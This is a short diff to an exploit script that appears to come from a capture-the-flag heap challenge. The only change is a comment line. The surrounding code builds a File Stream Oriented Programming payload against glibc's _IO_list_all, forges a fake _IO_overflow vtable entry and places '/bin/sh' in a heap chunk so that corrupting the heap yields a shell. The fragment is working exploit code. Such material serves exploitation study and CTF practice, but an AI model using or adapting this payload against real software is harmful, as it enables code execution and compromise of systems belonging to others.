@@ -79,7 +79,7 @@ def exploit(p):
 	payload = p64(0x61) + p64(0) + p64(io_list_all - 0x10)
 	# bypass check [rbx+0x20] < [rbx+0x28]
 	payload += p64(1) + p64(2)
-	# fd of chunk #1 is rbx, and arg of fake _IO_overflow function
+	# fd of chunk #1 is rbx, header of chunk #5, and arg of fake _IO_overflow function
 	edit(1, u64('/bin/sh\x00'), payload)
 	# vtable = [rbx+0xd8]
 	payload = p64(0) * 6 # padding
